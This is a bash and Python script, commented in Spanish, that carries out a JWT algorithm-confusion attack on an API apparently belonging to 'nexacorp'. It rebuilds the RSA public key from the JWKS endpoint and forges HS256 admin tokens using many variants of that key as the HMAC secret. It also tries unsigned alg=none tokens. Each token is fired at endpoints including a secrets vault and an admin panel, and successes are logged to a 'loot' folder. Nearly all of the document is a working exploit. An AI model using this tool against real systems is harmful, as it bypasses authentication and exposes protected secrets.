#!/usr/bin/env bash
# JWT confusion targeted — usa el kid exacto del JWKS y prueba ambos endpoints
set -euo pipefail
source "$(dirname "$0")/00_config.sh"

JWKS="${LOOT_DIR}/jwks.json"
PEM="${LOOT_DIR}/pubkey.pem"

[[ -f "${JWKS}" ]] || curl -s "${API_URL}/.well-known/jwks.json" -o "${JWKS}"
[[ -f "${PEM}" ]] || python3 -c "
import json,base64
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from cryptography.hazmat.backends import default_backend
def b(s): return base64.urlsafe_b64decode(s+'='*(-len(s)%4))
k=json.load(open('${JWKS}'))['keys'][0]
n=int.from_bytes(b(k['n']),'big'); e=int.from_bytes(b(k['e']),'big')
pub=RSAPublicNumbers(e,n).public_key(default_backend())
open('${PEM}','wb').write(pub.public_bytes(Encoding.PEM,PublicFormat.SubjectPublicKeyInfo))
"

KID="nexacorp-prod-key-1"
ENDPOINTS=(
  /api/v2/users/me
  /api/vault/critical-secrets
  /api/v2/users
  /api/v2/reports/generate
  /api/v2/audit
  /api/v2/admin
)

echo "[*] kid en JWKS: ${KID}"
echo "[*] PEM:"
cat "${PEM}"
echo
echo "[*] x5c decoded (lo que el server tiene en disco):"
jq -r '.keys[0].x5c' "${JWKS}" | base64 -d
echo

# Generador de tokens HS256 con secret arbitrario
python3 - <<'PYEOF' > "${LOOT_DIR}/all_tokens.txt"
import hmac, hashlib, json, base64, time, os, sys

LOOT = os.environ.get("LOOT_DIR","/root/nexacorp-loot")
KID = "nexacorp-prod-key-1"

# 7 variantes de secret
with open(os.path.join(LOOT,"pubkey.pem"),"rb") as f:
    pem_bytes = f.read()
pem_str = pem_bytes.decode()

import json as _json
jwks = _json.load(open(os.path.join(LOOT,"jwks.json")))
x5c_b64 = jwks["keys"][0]["x5c"]               # base64 string del PEM
x5c_bytes = base64.b64decode(x5c_b64)          # PEM bytes literales
n_bytes = base64.urlsafe_b64decode(jwks["keys"][0]["n"]+'='*(-len(jwks["keys"][0]["n"])%4))

secrets = {
  "pem_bytes":              pem_bytes,
  "pem_str_utf8":           pem_str.encode("utf-8"),
  "pem_stripped":           pem_str.strip().encode(),
  "pem_no_newlines":        pem_str.replace("\n","").encode(),
  "pem_no_headers":         "".join(l for l in pem_str.split("\n") if not l.startswith("-----") and l).encode(),
  "x5c_bytes_decoded":      x5c_bytes,                # = pem_bytes idealmente
  "x5c_b64_string":         x5c_b64.encode(),         # el base64 raw
  "n_modulus_bytes":        n_bytes,
}

now = int(time.time())

# Header con kid del JWKS
headers = [
    {"alg":"HS256","typ":"JWT","kid":KID},
    {"alg":"hs256","typ":"JWT","kid":KID},          # casing
    {"alg":"HS256","typ":"JWT"},                    # sin kid
]

# Payloads con claims variados
payloads = [
    {"sub":"admin","email":"admin@nexacorp.local","role":"admin","permissions":["admin","vault:read","vault:write"],"iat":now,"exp":now+3600},
    {"sub":"1","email":"admin@nexacorp.local","role":"admin","iat":now,"exp":now+3600},
    {"sub":"admin","email":"admin@nexacorp.local","role":"admin","iss":"nexacorp","aud":"vault","iat":now,"exp":now+3600},
    {"id":"admin","userId":"admin","role":"admin","scope":"vault:read vault:write","iat":now,"exp":now+3600},
    {"sub":"admin","role":"superuser","permissions":["*"],"iat":now,"exp":now+3600},
]

def b64url(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

for h in headers:
    h_b64 = b64url(json.dumps(h,separators=(',',':')).encode())
    for p in payloads:
        p_b64 = b64url(json.dumps(p,separators=(',',':')).encode())
        signing_input = f"{h_b64}.{p_b64}".encode()
        for sname, secret in secrets.items():
            sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
            tok = f"{h_b64}.{p_b64}.{b64url(sig)}"
            tag = f"alg={h['alg']}|kid={h.get('kid','-')}|secret={sname}|sub={p.get('sub') or p.get('id')}|role={p.get('role')}"
            print(f"{tag}\t{tok}")
PYEOF

TOTAL=$(wc -l < "${LOOT_DIR}/all_tokens.txt")
echo "[*] Tokens generados: ${TOTAL}"
echo "[*] Probando contra ${#ENDPOINTS[@]} endpoints..."
echo

OUT="${LOOT_DIR}/jwt_attack_results.txt"
: > "${OUT}"

for ep in "${ENDPOINTS[@]}"; do
  echo "########### ${ep} ###########" | tee -a "${OUT}"
  while IFS=$'\t' read -r tag token; do
    code=$(curl -s -o /tmp/_body -w '%{http_code}' "${API_URL}${ep}" -H "Authorization: Bearer ${token}")
    body=$(head -c 250 /tmp/_body)
    if [[ "${code}" != "401" && "${code}" != "404" && "${code}" != "000" ]]; then
      echo "[${code}] ${tag}" | tee -a "${OUT}"
      echo "    BODY: ${body}" | tee -a "${OUT}"
      echo "    TOKEN: ${token}" | tee -a "${OUT}"
      echo | tee -a "${OUT}"
    fi
  done < "${LOOT_DIR}/all_tokens.txt"
done

echo
echo "[*] Resumen de respuestas no-401:"
grep -E '^\[[0-9]' "${OUT}" | sort -u | head -30 || echo "    (todo 401 — necesitamos otra vía)"

echo
echo "[*] Probando un RS256 sin firma (alg=none variants)..."
for alg in "none" "None" "NONE" "nOnE"; do
  HEADER=$(python3 -c "import json,base64; print(base64.urlsafe_b64encode(json.dumps({'alg':'${alg}','typ':'JWT','kid':'${KID}'},separators=(',',':')).encode()).rstrip(b'=').decode())")
  PAYLOAD=$(python3 -c "import json,base64,time; print(base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin','iat':int(time.time()),'exp':int(time.time())+3600},separators=(',',':')).encode()).rstrip(b'=').decode())")
  for ep in /api/v2/users/me /api/vault/critical-secrets; do
    echo "--- ${ep} alg=${alg} ---"
    curl -s "${API_URL}${ep}" -H "Authorization: Bearer ${HEADER}.${PAYLOAD}." -w "\n[%{http_code}]\n"
    curl -s "${API_URL}${ep}" -H "Authorization: Bearer ${HEADER}.${PAYLOAD}" -w "\n[%{http_code}]\n"
  done
done
